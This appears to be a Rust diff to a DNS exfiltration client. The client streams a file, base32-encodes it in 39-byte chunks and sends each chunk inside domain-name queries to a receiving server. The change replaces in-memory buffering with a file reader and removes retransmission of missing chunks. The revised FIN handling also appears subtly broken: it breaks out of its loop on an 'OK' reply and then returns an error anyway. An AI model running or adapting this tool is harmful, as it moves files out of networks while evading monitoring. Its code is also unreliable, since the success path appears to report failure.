@@ -8,6 +8,8 @@ use rand::Rng;
 use std::io::{self, Write};
 use std::net::SocketAddr;
 use std::str::FromStr;
+use tokio::fs::File;
+use tokio::io::{AsyncReadExt, BufReader};
 use tokio::net::UdpSocket as TokioUdpSocket;
 use tokio::time::{Duration, sleep};
 
@@ -15,10 +17,11 @@ const CHUNK_SIZE: usize = 39;
 const MAX_FIN_RETRIES: usize = 5;
 const MAX_INIT_RETRIES: usize = 5;
 
-#[derive(Clone, Debug)]
+#[derive(Debug)]
 pub struct ExfilPayload {
     pub filename: String,
-    pub data: Vec<u8>,
+    pub bufreader: BufReader<File>,
+    pub size: u64,
 }
 
 #[derive(Debug, Clone)]
@@ -85,12 +88,31 @@ impl Client {
     async fn send_data(
         &self,
         client: &mut AsyncClient,
-        data: &[u8],
+        bufreader: &mut BufReader<File>,
         filename: &str,
         session_id: &str,
         total_chunks: usize,
     ) -> Result<(), DnsexError> {
-        for (seq, chunk) in data.chunks(CHUNK_SIZE).enumerate() {
+        let mut chunk_buffer = vec![0u8; CHUNK_SIZE];
+        let mut seq = 0;
+
+        loop {
+            let mut bytes_read = 0;
+            while bytes_read < CHUNK_SIZE {
+                let n = bufreader.read(&mut chunk_buffer[bytes_read..]).await?;
+                if n == 0 {
+                    break;
+                }
+
+                bytes_read += n;
+            }
+
+            if bytes_read == 0 {
+                break;
+            }
+
+            let chunk = &chunk_buffer[..bytes_read];
+
             loop {
                 let data_fqdn = self.build_fqdn(&BASE32_NOPAD.encode(chunk), seq, session_id, ChunkFlag::Data as u32);
 
@@ -110,13 +132,15 @@ impl Client {
                     break;
                 }
             }
+
+            seq += 1;
         }
 
         println!();
         Ok(())
     }
 
-    async fn send_fin(&self, client: &mut AsyncClient, session_id: &str, total_chunks: usize) -> Result<Vec<usize>, DnsexError> {
+    async fn send_fin(&self, client: &mut AsyncClient, session_id: &str, total_chunks: usize) -> Result<(), DnsexError> {
         let flags = ChunkFlag::Fin as u32;
         let fin_fqdn = self.build_fqdn(&BASE32_NOPAD.encode("EOF".as_bytes()), total_chunks, session_id, flags);
 
@@ -127,59 +151,23 @@ impl Client {
                 continue;
             }
 
-            for response in responses {
-                if response == "OK" {
-                    return Ok(Vec::new());
-                } else if let Some(missing_str) = response.strip_prefix("MISSING:") {
-                    let missing: Vec<usize> = missing_str.split(',').filter_map(|s| s.parse::<usize>().ok()).collect();
-                    return Ok(missing);
-                }
+            if responses.iter().any(|r| r == "OK") {
+                break;
             }
         }
 
         Err(DnsexError::TransferError("Failed to get valid FIN response from server".into()))
     }
 
-    async fn send_missing(&self, client: &mut AsyncClient, data: &[u8], session_id: &str, missing: &[usize]) -> Result<(), DnsexError> {
-        let chunks: Vec<&[u8]> = data.chunks(CHUNK_SIZE).collect();
-
-        for &seq in missing {
-            if seq < chunks.len() {
-                let data_fqdn = self.build_fqdn(&BASE32_NOPAD.encode(chunks[seq]), seq, session_id, ChunkFlag::Data as u32);
-                self.send_query(client, &data_fqdn).await?;
-            }
-        }
-
-        Ok(())
-    }
-
-    pub async fn send_payload(&self, payload: ExfilPayload) -> Result<(), DnsexError> {
+    pub async fn send_payload(&self, mut payload: ExfilPayload) -> Result<(), DnsexError> {
         let mut client = self.get_client().await?;
         let session_id = Client::generate_session_id();
-        let total_chunks = payload.data.chunks(CHUNK_SIZE).count();
+        let total_chunks = (payload.size as usize + CHUNK_SIZE - 1) / CHUNK_SIZE;
 
         self.send_init(&mut client, &payload.filename, &session_id, total_chunks).await?;
-        self.send_data(&mut client, &payload.data, &payload.filename, &session_id, total_chunks)
+        self.send_data(&mut client, &mut payload.bufreader, &payload.filename, &session_id, total_chunks)
             .await?;
-
-        let mut retries = 0;
-        const MAX_RETRIES: usize = 5;
-
-        loop {
-            let missing = self.send_fin(&mut client, &session_id, total_chunks).await?;
-
-            if missing.is_empty() {
-                break;
-            }
-
-            if retries >= MAX_RETRIES {
-                println!("transfer failed after: {} retries", MAX_RETRIES);
-                break;
-            }
-
-            self.send_missing(&mut client, &payload.data, &session_id, &missing).await?;
-            retries += 1;
-        }
+        self.send_fin(&mut client, &session_id, total_chunks).await?;
 
         Ok(())
     }
